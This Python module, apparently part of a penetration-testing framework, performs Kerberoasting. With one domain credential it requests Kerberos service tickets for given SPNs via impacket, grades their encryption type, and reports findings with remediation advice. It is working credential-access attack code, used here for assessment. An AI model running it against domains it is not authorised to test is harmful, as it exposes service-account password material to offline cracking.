"""
Kerberoasting — request service tickets (TGS-REP) for accounts with an SPN and
harvest the encrypted portion for offline cracking.

ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting). Requires a
single valid domain credential (any user).
"""

from __future__ import annotations

from typing import Any

from core.module_base import Finding, Module

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    _HAVE_IMPACKET = True
except Exception:  # noqa: BLE001
    _HAVE_IMPACKET = False

# enctype -> (label, weak?)
_ENCTYPES = {
    23: ("RC4-HMAC (arcfour)", True),
    17: ("AES128-CTS-HMAC-SHA1", False),
    18: ("AES256-CTS-HMAC-SHA1", False),
    16: ("DES3-CBC-SHA1", True),
}


class KerberoastModule(Module):
    name = "kerberoast"
    tactic = "Credential Access"
    technique_id = "T1558.003"
    description = "Request TGS for SPN accounts and grade ticket enctype strength."

    def run(self, engagement, target: str, **opts: Any) -> list[Finding]:
        realm = opts["realm"]
        username = opts["username"]
        password = opts.get("password", "")
        spns: list[str] = opts.get("spns", [])
        if not _HAVE_IMPACKET:
            return [self.finding(
                title="Kerberoast module requires impacket", severity="INFO",
                target=target, description="impacket not installed in this environment.",
                remediation="pip install impacket to run this module live.")]

        user_principal = Principal(
            username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, _okey, skey = engagement.guarded_action(
            "kerberos.as_req", target,
            lambda: getKerberosTGT(user_principal, password, realm,
                                   None, None, None, kdcHost=target),
            realm=realm, principal=username)

        findings: list[Finding] = []
        for spn in spns:
            sp = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, _c, _ok, _sk = engagement.guarded_action(
                "kerberos.tgs_req", target,
                lambda sp=sp: getKerberosTGS(sp, realm, None, tgt, cipher, skey,
                                             kdcHost=target),
                realm=realm, spn=spn)
            etype = int(tgs["ticket"]["enc-part"]["etype"])
            label, weak = _ENCTYPES.get(etype, (f"etype {etype}", True))
            findings.append(self.finding(
                title=f"Service ticket obtained for SPN {spn}",
                severity="HIGH" if weak else "MEDIUM", target=target,
                description=(f"A TGS-REP for {spn} was issued with encryption "
                             f"{label}. The encrypted portion is derived from the "
                             "service account's password hash and is crackable offline."
                             + (" RC4/3DES tickets crack dramatically faster."
                                if weak else "")),
                evidence={"spn": spn, "enctype": etype, "enctype_label": label,
                          "weak_enctype": weak},
                remediation=("Use long, random (25+ char) managed service-account "
                             "passwords or gMSAs; force AES-only; monitor Event 4769."),
            ))
        return findings
